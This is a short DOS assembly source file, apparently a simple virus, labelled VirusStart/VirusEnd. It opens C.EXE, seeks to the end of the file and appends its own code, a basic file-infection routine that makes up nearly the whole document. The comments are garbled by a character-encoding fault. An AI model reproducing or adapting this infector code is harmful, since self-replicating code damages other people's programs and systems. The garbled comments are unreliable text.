assume cs:code,ds:code
code segment
VirusStart:
pop si
start: jmp xc
;---------------------------------------------
f_namea db 'C.EXE',0 ;f_namea ����ļ�����
f_worda dw ?,0 ;f-worda ���'�ļ�����!'
f_hao dw ?,0 ;f_hao ��ž��
VirusLength equ VirusEnd-VirusStart 
;-----------------------------------------------
xc:
mov ah,3dh ;���ļ�
mov dx,code
mov ds,dx
lea dx,f_namea 
mov al,2 
int 21h 
mov f_hao,ax ;����AX�ļ����->��f_hao���
xwz:
mov ah,42h ;�ƶ��ļ�ָ��
mov al,2 ;���ļ�β��
mov bx,f_hao
xor cx,cx
xor dx,dx
int 21h
xw:
mov ah,40h ;д������
mov bx,f_hao ;���ļ������bx
mov dx,si 
mov cx,VirusLength 
int 21h
xend: 
mov ax,4c00h
int 21h
VirusEnd EQU $
code ends
end start